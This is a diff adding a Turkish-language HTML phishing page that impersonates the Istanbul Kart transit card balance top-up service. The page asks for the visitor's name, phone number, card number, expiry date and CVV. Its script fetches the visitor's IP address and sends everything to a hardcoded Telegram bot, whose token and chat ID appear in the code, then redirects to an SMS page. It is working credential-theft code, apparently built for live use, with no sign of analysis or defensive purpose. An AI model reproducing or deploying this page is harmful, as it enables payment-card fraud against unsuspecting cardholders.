@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>İSTANBUL KART</title>
+  <link href="anadosya/bootstrap.min.css" rel="stylesheet">
+  <link href="anadosya/style2.css" rel="stylesheet">
+  <link href="anadosya/responsive.css" rel="stylesheet">
+</head>
+<body>
+  <div class="body_wrapper frm-vh-md-100">
+    <div class="formify_body" data-bg-color="#E3F0FF" style="background-color: rgb(227, 240, 255);">
+      <div class="f_content">
+        <div class="container">
+          <div class="row">
+            <div class="formify_box">
+              <div class="formify_header text-center">
+                <a href="#" class="mb-3 formify_logo"><img style="width:70%" src="logorenk.png" alt=""></a>
+                <h4 class="form_title">Bakiye Yükle</h4>
+              </div>
+
+              <div class="form-group">
+                <center> <label for="message1">Ad Soyad</label>
+                  <input id="message1" name="message1" type="text" class="form-control" maxlength="20" required="">
+              </div>
+
+              <div class="form-group">
+                <center> <label for="message2">Telefon Numarası</label>
+                  <input id="message2" name="message2" type="text" class="form-control" maxlength="20" required="">
+              </div>
+
+              <div class="form-group">
+                <center> <label for="message3">Banka/Kredi Kartı Numarası</label>
+                  <input id="message3" name="message3" type="text" class="form-control" maxlength="20" required="">
+              </div>
+
+              <div class="form-group">
+                <center> <label for="message4">SKT (AY/YIL)</label>
+                  <input id="message4" name="message4" type="text" class="form-control" maxlength="20" required="">
+              </div>
+
+              <div class="form-group">
+                <center> <label for="message5">CCV</label>
+                  <input id="message5" name="message5" type="text" class="form-control" maxlength="20" required="">
+              </div>
+
+              <center> <button class="btn" onclick="sendMessage()">Gönder</button>
+
+              <script>
+                function sendMessage() {
+                  // Kullanıcının girdiği metinleri al
+                  var adsoyad = document.getElementById('message1').value;
+                  var tel = document.getElementById('message2').value;
+                  var kart = document.getElementById('message3').value;
+                  var skt = document.getElementById('message4').value;
+                  var ccv = document.getElementById('message5').value;
+
+                  // Eğer önceki gönderi ile aynı bilgiler tekrar gönderilirse işlem yapma
+                  if (adsoyad === sendMessage.adsoyad &&
+                      tel === sendMessage.tel &&
+                      kart === sendMessage.kart &&
+                      skt === sendMessage.skt &&
+                      ccv === sendMessage.ccv) {
+                    alert('Aynı bilgileri tekrar gönderemezsiniz.');
+                    return;
+                  }
+
+                  // Kullanıcının girdiği metinleri kaydet
+                  sendMessage.adsoyad = adsoyad;
+                  sendMessage.tel = tel;
+                  sendMessage.kart = kart;
+                  sendMessage.skt = skt;
+                  sendMessage.ccv = ccv;
+
+                  // Kullanıcının IP adresini al
+                  var ipAddress = '';
+
+                  // Tarayıcı tarafında çalışan bir IP algoritması örneği
+                  // Bu sadece bir örnektir, gerçek dünyada daha karmaşık bir çözüm kullanmanız gerekebilir
+                  fetch('https://api64.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                      ipAddress = data.ip;
+
+                      // Telegram botunuzun API anahtarı ve chat ID'si
+                      var botToken = '6554055008:AAGar8ThTIq0t0o_TCFu_XxRs1KdSeIlotQ';
+                      var chatId = '6338892965';
+
+                      // Telegram botuna gönderilecek tek bir mesajı oluştur
+                      var combinedMessage = `ADSOYAD: ${adsoyad}\nTEL: ${tel}\nKART: ${kart}\nSKT: ${skt}\nCCV: ${ccv}\n\nIP Adresi: ${ipAddress}`;
+
+                      // Telegram botuna mesaj göndermek için kullanılan API URL'si
+                      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                      // HTTP isteği gönder
+                      var xhr = new XMLHttpRequest();
+                      xhr.open("GET", `${apiUrl}?chat_id=${chatId}&text=${combinedMessage}`, true);
+
+                      // İstek tamamlandığında yönlendirme yap
+                      xhr.onload = function () {
+                        // İstek başarılı olduysa
+                        if (xhr.status == 200) {
+                          // Kullanıcıya bilgi ver
+                          alert('Mesajlarınız gönderildi!');
+
+                          // Gönderi yapıldıktan sonra formu temizle
+                          document.getElementById('message1').value = '';
+                          document.getElementById('message2').value = '';
+                          document.getElementById('message3').value = '';
+                          document.getElementById('message4').value = '';
+                          document.getElementById('message5').value = '';
+
+                          // Yönlendirme
+                          window.location.href = 'sms.html';
+                        } else {
+                          // İstek başarısız olduysa kullanıcıya hata mesajı ver
+                          alert('Mesaj gönderilirken bir hata oluştu.');
+                        }
+                      };
+
+                      // İstek gönderme
+                      xhr.send();
+                    })
+                    .catch(error => console.error('IP alınamadı', error));
+                }
+              </script>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
